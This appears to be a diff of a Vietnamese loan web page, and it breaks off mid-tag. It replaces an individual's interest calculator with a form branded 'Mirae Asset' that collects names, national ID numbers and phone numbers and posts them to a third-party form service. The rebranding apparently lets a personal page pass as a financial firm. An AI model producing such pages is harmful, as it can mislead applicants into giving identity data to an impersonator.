@@ -2,187 +2,73 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8" />
-  <title>Tính Lãi Suất Vay (Của Thiên)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Đăng Ký Vay - Mirae Asset</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      max-width: 800px;
-      margin: 20px auto;
-      padding: 20px;
-      background: linear-gradient(135deg, #d0e6f7, #f5faff);
+      background: linear-gradient(135deg, #004a99, #00aaff);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
     }
-    nav {
-      text-align: right;
-      margin-bottom: 20px;
+    form {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      max-width: 420px;
+      width: 100%;
     }
-    nav a {
-      text-decoration: none;
-      color: #007bff;
-      font-weight: bold;
-      margin-left: 20px;
-    }
-    h1 {
+    h2 {
       text-align: center;
-      border: 2px solid #007bff;
-      display: inline-block;
-      padding: 10px 20px;
-      border-radius: 8px;
+      margin-bottom: 20px;
+      color: #004a99;
     }
-    label { display: block; margin-top: 10px; }
-    input { width: 100%; padding: 8px; margin-top: 5px; }
-    button { margin-top: 15px; padding: 10px 20px; margin-right: 10px; }
-    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
-    table, th, td { border: 1px solid #333; }
-    th, td { padding: 8px; text-align: center; }
-    footer { text-align: center; margin-top: 40px; font-size: 14px; color: #555; }
-    #registerForm { margin-top: 40px; }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      background: #004a99;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #0066cc;
+    }
+    label {
+      font-weight: bold;
+      color: #333;
+    }
+    footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #fff;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
+  <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
+    <h2>Đăng Ký Vay Mirae Asset</h2>
+    <label>Họ và tên:</label>
+    <input type="text" name="Họ và tên" placeholder="Nhập họ tên" required />
 
-  <!-- Menu -->
-  <nav>
-    <a href="#loanCalc">TÍNH LÃI SUẤT</a>
-    <a href="#registerForm">ĐĂNG KÝ VAY</a>
-  </nav>
+    <label>Số CCCD:</label>
+    <input type="text" name="CCCD" placeholder="Nhập số CCCD" required />
 
-  <!-- Tiêu đề -->
-  <h1 id="loanCalc">Tính Lãi Suất Vay (Liên hệ: 0964307247 Mr Thiên)</h1>
+    <label>Số điện thoại:</label>
+    <input type="tel" name="Số điện thoại" placeholder="Nhập số điện thoại" required />
 
-  <!-- Form tính lãi -->
-  <label>Ngày Giải Ngân:
-    <input type="date" id="disbursalDate" />
-  </label>
-
-  <label>Ngày Kỳ Đóng Đầu Tiên:
-    <input type="date" id="firstEmiDate" />
-  </label>
-
-  <label>Số Tiền Vay (VND):
-    <input type="text" id="loanAmount" value="" oninput="formatNumber(this)" />
-  </label>
-
-  <label>% Bảo Hiểm Khoản Vay (nếu có):
-    <input type="number" id="insurancePercent" value="7.7" step="0.1" />
-  </label>
-
-  <label>Lãi Suất (%/năm):
-    <input type="number" id="interestRate" value="52" />
-  </label>
-
-  <label>Số Kỳ Vay (tháng):
-    <input type="number" id="months" value="24" />
-  </label>
-
-  <button onclick="calculateLoan()">Tính Lịch Thanh Toán Tham Khảo</button>
-  <button onclick="printPDF()">In PDF</button>
-  <button onclick="exportExcel()">Xuất Excel</button>
-
-  <div id="result"></div>
-
-  <!-- Form đăng ký vay -->
-  <div id="registerForm">
-    <h2>ĐĂNG KÝ VAY</h2>
-    <form action="https://formspree.io/f/xanbnrnk" method="POST">
-      <label>Họ tên:
-        <input type="text" name="Họ tên" required />
-      </label>
-      <label>Số CCCD:
-        <input type="text" name="Số CCCD" required />
-      </label>
-      <label>Số điện thoại:
-        <input type="tel" name="Số điện thoại" required />
-      </label>
-      <label>Số tiền muốn vay (VND):
-        <input type="text" name="Số tiền muốn vay" required />
-      </label>
-      <button type="submit">Đăng Ký</button>
-    </form>
-  </div>
-
-  <footer>© Copyright 2025 Võ Quốc Thiên. Giải Pháp Vay Tiêu Dùng Uy Tín & Linh Hoạt</footer>
-
-  <!-- Thư viện SheetJS -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
-
-  <script>
-    function formatNumber(input) {
-      let value = input.value.replace(/\D/g, "");
-      if (value) {
-        input.value = Number(value).toLocaleString('vi-VN').replace(/,/g, '.');
-      } else {
-        input.value = "";
-      }
-    }
-
-    function parseNumber(str) {
-      return Number(str.replace(/\./g, ""));
-    }
-
-    function calculateLoan() {
-      const disbursalDate = new Date(document.getElementById('disbursalDate').value);
-      const firstEmiDate = new Date(document.getElementById('firstEmiDate').value);
-      const loanAmount = parseNumber(document.getElementById('loanAmount').value);
-      const insurancePercent = Number(document.getElementById('insurancePercent').value);
-      const interestRate = Number(document.getElementById('interestRate').value);
-      const months = Number(document.getElementById('months').value);
-
-      const insurance = loanAmount * insurancePercent / 100;
-      const totalLoan = loanAmount + insurance;
-      const monthlyRate = interestRate / 12 / 100;
-
-      const EMI = totalLoan * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
-      const collectionFee = 12000;
-
-      let table = `<h2>Kết Quả</h2>
-                  <p>Tổng vay + BH: ${totalLoan.toLocaleString().replace(/,/g, '.')} VND</p>
-                  <p>Phí thu hộ mỗi kỳ: ${collectionFee.toLocaleString().replace(/,/g, '.')} VND (cố định)</p>
-                  <p>Tổng thanh toán hàng tháng (gồm phí thu hộ): ${(EMI + collectionFee).toLocaleString(undefined, {maximumFractionDigits: 0}).replace(/,/g, '.')} VND</p>
-                  <table id="repaymentTable">
-                  <tr><th>Kỳ</th><th>Ngày Thanh Toán</th><th>Tiền Gốc</th><th>Tiền Lãi</th><th>Tổng Tiền Đóng</th><th>Dư Nợ Còn Lại</th></tr>`;
-
-      let remaining = totalLoan;
-
-      for (let i = 1; i <= months; i++) {
-        let interest = remaining * monthlyRate;
-        let principal = EMI - interest;
-
-        let payDate = new Date(firstEmiDate);
-        payDate.setMonth(payDate.getMonth() + i - 1);
-
-        table += `<tr>
-          <td>${i}</td>
-          <td>${payDate.toLocaleDateString()}</td>
-          <td>${principal.toLocaleString(undefined, {maximumFractionDigits: 0}).replace(/,/g, '.')}</td>
-          <td>${interest.toLocaleString(undefined, {maximumFractionDigits: 0}).replace(/,/g, '.')}</td>
-          <td>${(EMI + collectionFee).toLocaleString(undefined, {maximumFractionDigits: 0}).replace(/,/g, '.')}</td>
-          <td>${(remaining - principal).toLocaleString(undefined, {maximumFractionDigits: 0}).replace(/,/g, '.')}</td>
-        </tr>`;
-
-        remaining -= principal;
-      }
-
-      table += `</table>
-                <p style="margin-top:20px; color:#b30000; font-style:italic;">
-                  Đây chỉ là bảng tham khảo, vui lòng liên hệ trực tiếp nhân viên để được tư vấn cụ thể và chính xác.
-                </p>`;
-
-      document.getElementById('result').innerHTML = table;
-    }
-
-    function printPDF() {
-      window.print();
-    }
-
-    function exportExcel() {
-      let table = document.getElementById('repaymentTable');
-      if (!table) {
-        alert("Vui lòng tính lịch thanh toán trước khi xuất Excel.");
-        return;
-      }
-      let wb = XLSX.utils.table_to_book(table, { sheet: "LichThanhToan" });
-      XLSX.writeFile(wb, "Lich_Thanh_Toan.xlsx");
-    }
-  </script>
-</body>
-</html>
+    <label>Số tiền muốn vay:</label>
+    <input type="text" id="soTien" name="Số tiền muốn vay
